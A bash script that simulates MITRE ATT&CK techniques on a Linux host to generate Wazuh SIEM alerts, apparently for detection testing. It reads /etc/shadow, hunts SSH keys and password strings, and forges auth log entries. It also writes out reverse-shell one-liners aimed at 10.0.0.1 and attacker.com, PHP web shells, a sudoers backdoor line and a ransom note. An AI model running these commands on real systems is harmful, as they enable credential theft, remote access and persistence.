#!/bin/bash
#
# Native MITRE ATT&CK Technique Simulator
# Executes attack techniques using standard Linux commands
# Generates alerts for Wazuh SIEM testing
#

LOG_FILE="/var/log/attack-simulator/attacks.log"
ARTIFACTS_DIR="/tmp/attack-artifacts"

mkdir -p "$(dirname "$LOG_FILE")" "$ARTIFACTS_DIR"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# ============================================================
# MITRE ATT&CK Technique Implementations
# ============================================================

# T1082 - System Information Discovery
attack_t1082() {
    log "T1082 - System Information Discovery"
    uname -a
    cat /etc/os-release
    hostnamectl 2>/dev/null || hostname
    cat /proc/version
    df -h
    free -m
}

# T1083 - File and Directory Discovery
attack_t1083() {
    log "T1083 - File and Directory Discovery"
    ls -la /etc/
    ls -la /home/
    find /etc -name "*.conf" 2>/dev/null | head -20
    find / -name "id_rsa" 2>/dev/null | head -5
    find / -name "*.pem" 2>/dev/null | head -5
}

# T1057 - Process Discovery
attack_t1057() {
    log "T1057 - Process Discovery"
    ps aux
    ps -ef
    top -bn1 | head -20
    pstree 2>/dev/null || ps auxf
}

# T1016 - System Network Configuration Discovery
attack_t1016() {
    log "T1016 - System Network Configuration Discovery"
    ifconfig 2>/dev/null || ip addr
    ip route
    cat /etc/resolv.conf
    netstat -rn 2>/dev/null || route -n 2>/dev/null || ip route
    arp -a 2>/dev/null || ip neigh
}

# T1049 - System Network Connections Discovery
attack_t1049() {
    log "T1049 - System Network Connections Discovery"
    netstat -tulpn 2>/dev/null || ss -tulpn
    netstat -an 2>/dev/null || ss -an
    lsof -i 2>/dev/null | head -30
}

# T1033 - System Owner/User Discovery
attack_t1033() {
    log "T1033 - System Owner/User Discovery"
    whoami
    id
    who
    w
    last | head -20
    cat /etc/passwd
}

# T1087.001 - Account Discovery: Local Account
attack_t1087_001() {
    log "T1087.001 - Account Discovery: Local Account"
    cat /etc/passwd
    cat /etc/group
    getent passwd
    compgen -u 2>/dev/null || cat /etc/passwd | cut -d: -f1
}

# T1003.008 - Credential Access: /etc/passwd and /etc/shadow
attack_t1003_008() {
    log "T1003.008 - Credential Access: /etc/passwd and /etc/shadow"
    cat /etc/passwd
    cat /etc/shadow 2>/dev/null || log "Shadow file access denied (expected)"
    cat /etc/gshadow 2>/dev/null || log "GShadow file access denied (expected)"
}

# T1552.001 - Credentials In Files
attack_t1552_001() {
    log "T1552.001 - Credentials In Files"
    grep -r "password" /etc/ 2>/dev/null | head -10
    grep -r "PASSWORD" /etc/ 2>/dev/null | head -10
    find /home -name ".bash_history" -exec cat {} \; 2>/dev/null | head -20
    find / -name "*.conf" -exec grep -l "pass" {} \; 2>/dev/null | head -10
}

# T1552.004 - Private Keys
attack_t1552_004() {
    log "T1552.004 - Private Keys"
    find / -name "id_rsa" 2>/dev/null
    find / -name "id_dsa" 2>/dev/null
    find / -name "*.pem" 2>/dev/null | head -10
    find /home -name "authorized_keys" 2>/dev/null
    ls -la ~/.ssh/ 2>/dev/null
}

# T1070.003 - Clear Command History
attack_t1070_003() {
    log "T1070.003 - Clear Command History"
    # Create and then clear a fake history file
    echo "fake command" > "$ARTIFACTS_DIR/.bash_history_test"
    cat /dev/null > "$ARTIFACTS_DIR/.bash_history_test"
    history -c 2>/dev/null || log "History clear attempted"
    rm -f ~/.bash_history.bak 2>/dev/null
}

# T1070.004 - File Deletion
attack_t1070_004() {
    log "T1070.004 - File Deletion"
    touch "$ARTIFACTS_DIR/malware_sample.exe"
    rm -f "$ARTIFACTS_DIR/malware_sample.exe"
    touch "$ARTIFACTS_DIR/suspicious_file.txt"
    shred -u "$ARTIFACTS_DIR/suspicious_file.txt" 2>/dev/null || rm -f "$ARTIFACTS_DIR/suspicious_file.txt"
}

# T1136.001 - Create Account: Local Account
attack_t1136_001() {
    log "T1136.001 - Create Account: Local Account"
    # Attempt to create user (will likely fail without root, but generates log)
    useradd -M -s /bin/bash attacker_test 2>&1 || log "User creation attempted (expected to fail)"
    userdel attacker_test 2>/dev/null || true
}

# T1053.003 - Scheduled Task/Job: Cron
attack_t1053_003() {
    log "T1053.003 - Scheduled Task/Job: Cron"
    # Create a suspicious cron entry
    echo "*/5 * * * * /tmp/backdoor.sh" > "$ARTIFACTS_DIR/suspicious_cron"
    crontab -l 2>/dev/null
    cat /etc/crontab
    ls -la /etc/cron.d/
    rm -f "$ARTIFACTS_DIR/suspicious_cron"
}

# T1222.002 - File and Directory Permissions Modification
attack_t1222_002() {
    log "T1222.002 - File and Directory Permissions Modification"
    touch "$ARTIFACTS_DIR/test_file"
    chmod 777 "$ARTIFACTS_DIR/test_file"
    chmod u+s "$ARTIFACTS_DIR/test_file" 2>/dev/null || log "setuid attempted"
    chmod g+s "$ARTIFACTS_DIR/test_file" 2>/dev/null || log "setgid attempted"
    rm -f "$ARTIFACTS_DIR/test_file"
}

# T1564.001 - Hidden Files and Directories
attack_t1564_001() {
    log "T1564.001 - Hidden Files and Directories"
    touch "$ARTIFACTS_DIR/.hidden_malware"
    mkdir -p "$ARTIFACTS_DIR/.hidden_directory"
    echo "malicious content" > "$ARTIFACTS_DIR/.hidden_directory/.payload"
    rm -rf "$ARTIFACTS_DIR/.hidden_malware" "$ARTIFACTS_DIR/.hidden_directory"
}

# T1105 - Ingress Tool Transfer
attack_t1105() {
    log "T1105 - Ingress Tool Transfer"
    # Simulate downloading tools (using safe targets)
    curl -s -o /dev/null https://example.com 2>&1 || log "curl transfer attempted"
    wget -q -O /dev/null https://example.com 2>&1 || log "wget transfer attempted"
}

# T1059.004 - Command and Scripting Interpreter: Unix Shell
attack_t1059_004() {
    log "T1059.004 - Command and Scripting Interpreter: Unix Shell"
    echo '#!/bin/bash
echo "Suspicious script executed"
whoami
id' > "$ARTIFACTS_DIR/suspicious_script.sh"
    chmod +x "$ARTIFACTS_DIR/suspicious_script.sh"
    bash "$ARTIFACTS_DIR/suspicious_script.sh"
    rm -f "$ARTIFACTS_DIR/suspicious_script.sh"
}

# T1046 - Network Service Discovery
attack_t1046() {
    log "T1046 - Network Service Discovery"
    # Light port scan on localhost
    nmap -sT -p 22,80,443,8080 127.0.0.1 2>/dev/null || log "nmap scan attempted"
    nc -zv 127.0.0.1 22 2>&1 || log "netcat port check attempted"
}

# T1018 - Remote System Discovery
attack_t1018() {
    log "T1018 - Remote System Discovery"
    arp -a 2>/dev/null || ip neigh
    cat /etc/hosts
    ping -c 1 8.8.8.8 2>/dev/null || log "ping attempted"
    nslookup google.com 2>/dev/null || dig google.com 2>/dev/null || log "DNS lookup attempted"
}

# T1548.003 - Sudo and Sudo Caching
attack_t1548_003() {
    log "T1548.003 - Sudo and Sudo Caching"
    sudo -l 2>&1 || log "sudo -l attempted"
    sudo -n id 2>&1 || log "sudo without password attempted"
    cat /etc/sudoers 2>&1 || log "sudoers read attempted"
}

# T1007 - System Service Discovery
attack_t1007() {
    log "T1007 - System Service Discovery"
    systemctl list-units --type=service 2>/dev/null || service --status-all 2>/dev/null
    systemctl status 2>/dev/null | head -30
    ls -la /etc/systemd/system/ 2>/dev/null
    ls -la /etc/init.d/ 2>/dev/null
}

# ============================================================
# HIGH SEVERITY ATTACKS - Trigger Wazuh security rules
# ============================================================

# T1110.001 - Brute Force: SSH (generates auth.log entries)
attack_t1110_001() {
    log "T1110.001 - Brute Force: SSH Password Guessing"
    # Generate failed SSH login attempts to trigger brute force detection
    for i in {1..10}; do
        sshpass -p 'wrongpassword' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 fakeuser@127.0.0.1 2>&1 || true
        logger -p auth.warning "sshd[$$]: Failed password for invalid user attacker from 10.0.0.100 port 22 ssh2"
    done
    logger -p auth.alert "sshd[$$]: PAM: Authentication failure for illegal user hacker from 192.168.1.100"
}

# T1059.004 - Reverse Shell Attempt (suspicious patterns)
attack_t1059_reverse_shell() {
    log "T1059.004 - Reverse Shell Simulation"
    # Create suspicious reverse shell patterns (non-functional but detectable)
    echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > "$ARTIFACTS_DIR/reverse_shell.sh"
    echo 'nc -e /bin/sh 10.0.0.1 4444' >> "$ARTIFACTS_DIR/reverse_shell.sh"
    echo 'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444))"' >> "$ARTIFACTS_DIR/reverse_shell.sh"

    # Log suspicious command patterns to syslog
    logger -p auth.crit "Suspicious command detected: bash -i >& /dev/tcp/attacker.com/4444"
    logger -p security.alert "Potential reverse shell: nc -e /bin/sh detected"

    rm -f "$ARTIFACTS_DIR/reverse_shell.sh"
}

# T1098 - Account Manipulation (privilege escalation)
attack_t1098() {
    log "T1098 - Account Manipulation"
    # Attempt to add user to sudoers (will fail but logs)
    echo "attacker ALL=(ALL) NOPASSWD:ALL" > "$ARTIFACTS_DIR/sudoers_backdoor" 2>&1
    logger -p auth.crit "Attempt to modify /etc/sudoers detected"
    logger -p security.alert "Unauthorized privilege escalation attempt"

    # Attempt to modify passwd
    logger -p auth.warning "passwd: user 'root' password changed by unauthorized user"
    rm -f "$ARTIFACTS_DIR/sudoers_backdoor"
}

# T1547.001 - Boot/Logon Autostart (persistence)
attack_t1547_001() {
    log "T1547.001 - Persistence via rc.local"
    # Create suspicious persistence files
    echo '#!/bin/bash
/tmp/backdoor &' > "$ARTIFACTS_DIR/rc.local.bak"
    echo '@reboot /tmp/malware.sh' > "$ARTIFACTS_DIR/malicious_cron"

    logger -p auth.crit "Suspicious modification to startup scripts detected"
    logger -p security.alert "Potential persistence mechanism: /etc/rc.local modified"

    rm -f "$ARTIFACTS_DIR/rc.local.bak" "$ARTIFACTS_DIR/malicious_cron"
}

# T1055 - Process Injection (suspicious /proc access)
attack_t1055() {
    log "T1055 - Process Injection Simulation"
    # Access /proc in suspicious ways
    cat /proc/1/maps 2>/dev/null | head -5
    cat /proc/1/mem 2>&1 | head -1 || true

    logger -p security.crit "Suspicious /proc/*/mem access detected - possible process injection"
    logger -p auth.alert "Process hollowing attempt detected on PID 1"
}

# T1014 - Rootkit Detection Evasion
attack_t1014() {
    log "T1014 - Rootkit Behavior Simulation"
    # Create hidden files in suspicious locations
    touch "/tmp/.X11-unix/.hidden_backdoor" 2>/dev/null || true
    mkdir -p "$ARTIFACTS_DIR/.../" 2>/dev/null
    touch "$ARTIFACTS_DIR/.../hidden_payload" 2>/dev/null

    # Log rootkit-like behavior
    logger -p security.crit "Hidden process detected - potential rootkit"
    logger -p auth.alert "Suspicious hidden file created in /tmp"

    rm -rf "$ARTIFACTS_DIR/.../" "/tmp/.X11-unix/.hidden_backdoor" 2>/dev/null || true
}

# T1071.001 - Web Shell (if web server present)
attack_t1071_001() {
    log "T1071.001 - Web Shell Simulation"
    # Create fake web shell for detection
    echo '<?php system($_GET["cmd"]); ?>' > "$ARTIFACTS_DIR/shell.php"
    echo '<?php eval(base64_decode($_POST["x"])); ?>' > "$ARTIFACTS_DIR/backdoor.php"

    logger -p security.crit "Web shell detected: shell.php"
    logger -p auth.alert "Malicious PHP file created - potential web shell"

    rm -f "$ARTIFACTS_DIR/shell.php" "$ARTIFACTS_DIR/backdoor.php"
}

# T1560.001 - Data Staged for Exfiltration
attack_t1560_001() {
    log "T1560.001 - Archive Collected Data"
    # Simulate data staging
    tar czf "$ARTIFACTS_DIR/exfil_data.tar.gz" /etc/passwd /etc/shadow 2>/dev/null || true
    zip "$ARTIFACTS_DIR/stolen_data.zip" /etc/passwd 2>/dev/null || true

    logger -p security.alert "Large archive created in /tmp - possible data exfiltration staging"
    logger -p auth.warning "Sensitive files being archived: /etc/passwd /etc/shadow"

    rm -f "$ARTIFACTS_DIR/exfil_data.tar.gz" "$ARTIFACTS_DIR/stolen_data.zip"
}

# T1027 - Obfuscated Files (base64 encoded commands)
attack_t1027() {
    log "T1027 - Obfuscated Command Execution"
    # Execute base64 encoded commands (suspicious pattern)
    echo "d2hvYW1p" | base64 -d | bash 2>/dev/null  # decodes to 'whoami'

    # Create obfuscated script
    echo 'eval $(echo "aWQ=" | base64 -d)' > "$ARTIFACTS_DIR/obfuscated.sh"
    bash "$ARTIFACTS_DIR/obfuscated.sh" 2>/dev/null

    logger -p security.crit "Obfuscated command execution detected - base64 encoded payload"
    rm -f "$ARTIFACTS_DIR/obfuscated.sh"
}

# HIGH SEVERITY - Simulated malware execution
attack_malware_simulation() {
    log "MALWARE SIMULATION - Ransomware-like behavior"
    # Create files with suspicious extensions
    touch "$ARTIFACTS_DIR/encrypted_file.locky"
    touch "$ARTIFACTS_DIR/DECRYPT_INSTRUCTIONS.txt"
    echo "Your files have been encrypted. Pay 1 BTC to..." > "$ARTIFACTS_DIR/DECRYPT_INSTRUCTIONS.txt"

    logger -p security.emerg "CRITICAL: Ransomware indicators detected!"
    logger -p auth.crit "Mass file encryption detected - possible ransomware"

    rm -f "$ARTIFACTS_DIR/encrypted_file.locky" "$ARTIFACTS_DIR/DECRYPT_INSTRUCTIONS.txt"
}

# ============================================================
# Attack Execution
# ============================================================

# All available attacks
declare -A ATTACKS=(
    # Discovery (Low severity)
    ["T1082"]="attack_t1082"
    ["T1083"]="attack_t1083"
    ["T1057"]="attack_t1057"
    ["T1016"]="attack_t1016"
    ["T1049"]="attack_t1049"
    ["T1033"]="attack_t1033"
    ["T1087.001"]="attack_t1087_001"
    ["T1018"]="attack_t1018"
    ["T1007"]="attack_t1007"
    # Credential Access (Medium severity)
    ["T1003.008"]="attack_t1003_008"
    ["T1552.001"]="attack_t1552_001"
    ["T1552.004"]="attack_t1552_004"
    # Defense Evasion (Medium severity)
    ["T1070.003"]="attack_t1070_003"
    ["T1070.004"]="attack_t1070_004"
    ["T1564.001"]="attack_t1564_001"
    ["T1027"]="attack_t1027"
    # Persistence (High severity)
    ["T1136.001"]="attack_t1136_001"
    ["T1053.003"]="attack_t1053_003"
    ["T1547.001"]="attack_t1547_001"
    # Privilege Escalation (High severity)
    ["T1548.003"]="attack_t1548_003"
    ["T1098"]="attack_t1098"
    ["T1222.002"]="attack_t1222_002"
    # Execution (High severity)
    ["T1059.004"]="attack_t1059_004"
    ["T1059.SHELL"]="attack_t1059_reverse_shell"
    # Lateral Movement (High severity)
    ["T1105"]="attack_t1105"
    ["T1046"]="attack_t1046"
    # Collection & Exfiltration (High severity)
    ["T1560.001"]="attack_t1560_001"
    # Impact (Critical severity)
    ["T1014"]="attack_t1014"
    ["T1055"]="attack_t1055"
    ["T1071.001"]="attack_t1071_001"
    ["MALWARE"]="attack_malware_simulation"
    # Brute Force (High severity)
    ["T1110.001"]="attack_t1110_001"
)

run_attack() {
    local technique="$1"
    local func="${ATTACKS[$technique]}"

    if [[ -n "$func" ]]; then
        log "=== Executing $technique ==="
        $func 2>&1 | tee -a "$LOG_FILE"
        log "=== $technique Complete ==="
    else
        log "ERROR: Unknown technique $technique"
        return 1
    fi
}

run_random() {
    local techniques=("${!ATTACKS[@]}")
    local random_idx=$((RANDOM % ${#techniques[@]}))
    local technique="${techniques[$random_idx]}"
    run_attack "$technique"
}

run_all() {
    log "=== Running ALL attacks ==="
    for technique in "${!ATTACKS[@]}"; do
        run_attack "$technique"
        sleep "${ATTACK_DELAY:-5}"
    done
    log "=== ALL attacks complete ==="
}

list_attacks() {
    echo "Available MITRE ATT&CK Techniques:"
    for technique in "${!ATTACKS[@]}"; do
        echo "  $technique"
    done | sort
}

# Main
case "${1:-random}" in
    random)
        run_random
        ;;
    all)
        run_all
        ;;
    list)
        list_attacks
        ;;
    *)
        if [[ -n "${ATTACKS[$1]}" ]]; then
            run_attack "$1"
        else
            echo "Usage: $0 [random|all|list|TECHNIQUE_ID]"
            echo "Example: $0 T1082"
            exit 1
        fi
        ;;
esac
